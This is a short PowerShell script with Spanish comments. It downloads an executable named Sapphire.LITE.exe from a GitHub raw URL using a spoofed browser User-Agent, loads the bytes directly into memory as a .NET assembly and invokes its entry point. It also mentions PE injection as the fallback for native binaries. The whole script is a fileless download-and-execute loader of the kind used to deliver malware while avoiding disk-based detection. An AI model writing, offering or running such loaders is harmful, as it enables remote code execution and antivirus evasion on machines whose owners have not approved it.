# 1. Descargar con reintentos y manejo de errores
$url = "https://github.com/AL4AROX/BAMParser/raw/refs/heads/main/Sapphire.LITE.exe"
try {
    $wc = New-Object System.Net.WebClient
    $wc.Headers.Add("User-Agent", "Mozilla/5.0")
    $exeBytes = $wc.DownloadData($url)
    Write-Host "[+] Descargado: $($exeBytes.Length) bytes" -ForegroundColor Green
}
catch {
    Write-Host "[-] Error descargando: $_" -ForegroundColor Red
    exit
}

# 2. Verificar si es .NET Assembly válido
try {
    # Método más compatible
    $assembly = [System.Reflection.Assembly]::Load([byte[]]$exeBytes)
    Write-Host "[+] Ensamblado .NET cargado en RAM" -ForegroundColor Green
    
    # Ejecutar
    $assembly.EntryPoint.Invoke($null, $null)
}
catch {
    Write-Host "[-] No es .NET válido o es nativo" -ForegroundColor Yellow
    Write-Host "[-] Error: $_" -ForegroundColor Red
    
    # 3. Si es nativo, necesitas PE Injection (solo para pruebas)
    Write-Host "[!] Se requiere inyección PE avanzada" -ForegroundColor Magenta
    Write-Host "[!] Usa mejor tu Sapphire.ps1 existente" -ForegroundColor Magenta
}
